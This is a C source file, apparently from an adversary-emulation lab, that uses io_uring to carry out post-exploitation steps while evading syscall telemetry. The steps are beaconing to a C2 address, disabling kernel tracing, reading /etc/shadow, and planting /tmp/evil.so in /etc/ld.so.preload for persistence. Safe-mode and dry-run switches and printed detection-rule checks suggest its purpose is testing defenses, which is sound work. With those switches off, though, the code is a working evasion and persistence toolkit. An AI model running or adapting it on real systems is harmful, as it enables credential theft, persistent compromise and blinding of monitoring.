#include "evasion_lab.h"

int uring_init(struct io_uring *ring, unsigned entries) {
    int ret = io_uring_queue_init(entries, ring, 0);
    if (ret < 0) {
        fprintf(stderr, "[-] io_uring_queue_init failed: %s\n", strerror(-ret));
        return ret;
    }
    return 0;
}

void uring_cleanup(struct io_uring *ring) {
    if (ring) {
        io_uring_queue_exit(ring);
    }
}

int uring_open(struct io_uring *ring, const char *path, int flags, mode_t mode) {
    if (g_config.dry_run) {
        printf("[DRY-RUN] io_uring_prep_openat(AT_FDCWD, %s, flags=0x%x)\n", path, flags);
        return 999;
    }
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -ENOBUFS;

    io_uring_prep_openat(sqe, AT_FDCWD, path, flags, mode);
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(ring, &cqe);
    if (ret < 0) return ret;

    int res = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    return res;
}

int uring_close(struct io_uring *ring, int fd) {
    if (g_config.dry_run || fd == 999) return 0;
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -ENOBUFS;

    io_uring_prep_close(sqe, fd);
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(ring, &cqe);
    if (ret < 0) return ret;

    int res = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    return res;
}

int uring_unlink(struct io_uring *ring, const char *path) {
    if (g_config.dry_run) {
        printf("[DRY-RUN] io_uring_prep_unlinkat(AT_FDCWD, %s, 0)\n", path);
        return 0;
    }
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -ENOBUFS;

    io_uring_prep_unlinkat(sqe, AT_FDCWD, path, 0);
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(ring, &cqe);
    if (ret < 0) return ret;

    int res = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    return res;
}

int uring_read_file(struct io_uring *ring, const char *path, char *buf, size_t max_len) {
    int fd = uring_open(ring, path, O_RDONLY, 0);
    if (fd < 0) return fd;
    if (g_config.dry_run) {
        snprintf(buf, max_len, "[DRY-RUN simulated content of %s]", path);
        return strlen(buf);
    }

    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) {
        uring_close(ring, fd);
        return -ENOBUFS;
    }

    io_uring_prep_read(sqe, fd, buf, max_len - 1, 0);
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(ring, &cqe);
    if (ret < 0) {
        uring_close(ring, fd);
        return ret;
    }

    int bytes_read = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    uring_close(ring, fd);

    if (bytes_read >= 0) {
        buf[bytes_read] = '\0';
    }
    return bytes_read;
}

int uring_write_file(struct io_uring *ring, const char *path, const char *buf, size_t len, int flags, mode_t mode) {
    int fd = uring_open(ring, path, flags, mode);
    if (fd < 0) return fd;
    if (g_config.dry_run) {
        printf("[DRY-RUN] io_uring_prep_write(%s, len=%zu)\n", path, len);
        return len;
    }

    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) {
        uring_close(ring, fd);
        return -ENOBUFS;
    }

    io_uring_prep_write(sqe, fd, buf, len, 0);
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(ring, &cqe);
    if (ret < 0) {
        uring_close(ring, fd);
        return ret;
    }

    int bytes_written = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    uring_close(ring, fd);
    return bytes_written;
}

int uring_connect(struct io_uring *ring, const char *ip, int port) {
    if (g_config.dry_run) {
        printf("[DRY-RUN] io_uring_prep_connect(%s:%d)\n", ip, port);
        return 999;
    }

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return -errno;

    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
        close(sockfd);
        return -EINVAL;
    }

    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) {
        close(sockfd);
        return -ENOBUFS;
    }

    io_uring_prep_connect(sqe, sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(ring, &cqe);
    if (ret < 0) {
        close(sockfd);
        return ret;
    }

    int res = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    if (res < 0) {
        close(sockfd);
        return res;
    }
    return sockfd;
}

int uring_send_all(struct io_uring *ring, int fd, const char *buf, size_t len) {
    if (g_config.dry_run || fd == 999) {
        printf("[DRY-RUN] io_uring_prep_send(fd=%d, len=%zu)\n", fd, len);
        return len;
    }
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -ENOBUFS;

    io_uring_prep_send(sqe, fd, buf, len, 0);
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(ring, &cqe);
    if (ret < 0) return ret;

    int bytes_sent = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    return bytes_sent;
}

int uring_recv(struct io_uring *ring, int fd, char *buf, size_t len) {
    if (g_config.dry_run || fd == 999) return 0;
    struct io_uring_sqe *sqe = io_uring_get_sqe(ring);
    if (!sqe) return -ENOBUFS;

    io_uring_prep_recv(sqe, fd, buf, len, 0);
    io_uring_submit(ring);

    struct io_uring_cqe *cqe;
    int ret = io_uring_wait_cqe(ring, &cqe);
    if (ret < 0) return ret;

    int bytes_recv = cqe->res;
    io_uring_cqe_seen(ring, cqe);
    return bytes_recv;
}

/* ============================================================
 * PHASE ROUTINES
 * ============================================================ */

void phase1_init_recon(struct io_uring *ring) {
    printf("\n[*] === PHASE 1: io_uring Ring Initialization & Probe ===\n");
    printf("[+] io_uring queue initialized (depth: %d entries)\n", QUEUE_DEPTH);
    printf("[+] Kernel worker threads (io_wq) allocated in background\n");
    printf("[+] Telemetry check: auditbeat should fire Rule 1 (io_uring_setup chokepoint)\n");
}

void phase2_c2_channel(struct io_uring *ring, const char *c2_ip, int port) {
    printf("\n[*] === PHASE 2: Asynchronous C2 Channel via io_uring ===\n");
    printf("[*] Connecting to %s:%d asynchronously...\n", c2_ip, port);
    int sock = uring_connect(ring, c2_ip, port);
    if (sock < 0) {
        printf("[-] C2 connection failed or simulated (code: %d). Continuing.\n", sock);
        return;
    }
    printf("[+] Connected to C2 endpoint via kernel worker thread\n");
    const char *beacon = "[BEACON] Host telemetry assessment active via io_uring\\n";
    uring_send_all(ring, sock, beacon, strlen(beacon));
    if (sock != 999) close(sock);
}

void phase3_defense_suppression(struct io_uring *ring) {
    printf("\n[*] === PHASE 3: Defense Suppression Validation (REAPER) ===\n");
    const char *tracing_target = g_config.safe_mode ?
        SAFE_SANDBOX "/tracing_on" : "/sys/kernel/debug/tracing/tracing_on";

    printf("[*] Probing kernel tracing toggle (%s)...\n", tracing_target);
    int ret = uring_write_file(ring, tracing_target, "0\n", 2, O_WRONLY | O_CREAT, 0644);
    printf("[+] Result: %s (bytes: %d)\n", ret >= 0 ? "SUCCESS" : "BLOCKED / PERMISSION DENIED", ret);

    printf("[*] Telemetry check: Rule 5 (Tracing Disabled) & Rule 6 (BPF Maps Tampering)\n");
}

void phase4_telemetry_probe(struct io_uring *ring) {
    printf("\n[*] === PHASE 4: Sensitive State Telemetry & Credential Probe ===\n");
    const char *target = g_config.safe_mode ? SAFE_SANDBOX "/shadow" : "/etc/shadow";

    char buf[1024];
    printf("[*] Asynchronously reading sensitive artifact: %s\n", target);
    int bytes = uring_read_file(ring, target, buf, sizeof(buf));
    if (bytes >= 0) {
        printf("[+] Read %d bytes via io_uring worker thread without syscall entry tracepoint!\n", bytes);
        if (g_config.verbose) printf("[+] Preview: %.*s\n", bytes > 100 ? 100 : bytes, buf);
    } else {
        printf("[-] Target inaccessible or simulated (code: %d)\n", bytes);
    }
    printf("[+] Telemetry check: Rule 8 (Credential File Exfiltration) & ML Job 3\n");
}

void phase5_persistence_cleanup(struct io_uring *ring) {
    printf("\n[*] === PHASE 5: Persistence Audit & Self-Unlink ===\n");
    const char *preload_target = g_config.safe_mode ?
        SAFE_SANDBOX "/ld.so.preload" : "/etc/ld.so.preload";

    printf("[*] Validating dynamic linker hook write: %s\n", preload_target);
    uring_write_file(ring, preload_target, "/tmp/evil.so\n", 13, O_WRONLY | O_CREAT, 0644);

    printf("[*] Demonstrating asynchronous unlinking of test artifact...\n");
    const char *unlink_target = g_config.safe_mode ?
        SAFE_SANDBOX "/dummy_artifact.bin" : "/tmp/dummy_artifact.bin";
    uring_unlink(ring, unlink_target);

    printf("[+] Telemetry check: Rule 4 (ld.so.preload persistence) & Rule 10 (Self-deletion)\n");
}
